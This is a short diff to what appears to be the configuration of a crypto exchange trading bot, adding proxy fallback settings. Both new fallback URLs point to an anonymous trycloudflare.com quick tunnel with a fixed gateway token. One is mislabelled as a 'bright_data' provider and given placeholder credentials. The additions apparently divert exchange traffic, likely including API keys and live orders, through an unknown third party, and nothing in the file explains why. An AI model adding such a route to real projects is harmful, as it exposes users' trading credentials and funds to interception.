@@ -151,6 +151,8 @@ AUTOGPT_STATUS_URL     = ""
 # off: force direct requests (useful for servers outside proxy)
 # required: require proxy; fail request if proxy is unavailable
 PROXY_MODE = "auto"
+PROXY_FALLBACK_URL = "https://twiki-too-veterans-sec.trycloudflare.com/proxy"
+PROXY_FALLBACK_AUTH_HEADER = "X-Gateway-Token: gw-2026-06-01"
 
 # Comma-separated exchanges that should bypass proxy when PROXY_MODE=auto.
 # Example: "bitmart,mexc"
@@ -158,6 +160,12 @@ PROXY_MODE = "auto"
 # due to Cloudflare Workers egress WAF blocking. Configure PROXY_URL or PROXY_LIST
 # to route Bitget traffic through a static IP proxy.
 DIRECT_EXCHANGES = ""
+
+EXTERNAL_PROXY_FALLBACK_URL = "https://twiki-too-veterans-sec.trycloudflare.com/proxy"
+EXTERNAL_PROXY_FALLBACK_PROVIDER = "bright_data"
+EXTERNAL_PROXY_FALLBACK_USERNAME = "enabled"
+EXTERNAL_PROXY_FALLBACK_PASSWORD = "enabled"
+EXTERNAL_PROXY_FALLBACK_AUTH_HEADER = "X-Gateway-Token: gw-2026-06-01"
 
 # Comma-separated list of exchanges allowed for live execution.
 # Keep scope focused on known healthy accounts to avoid noisy auth/network failures.
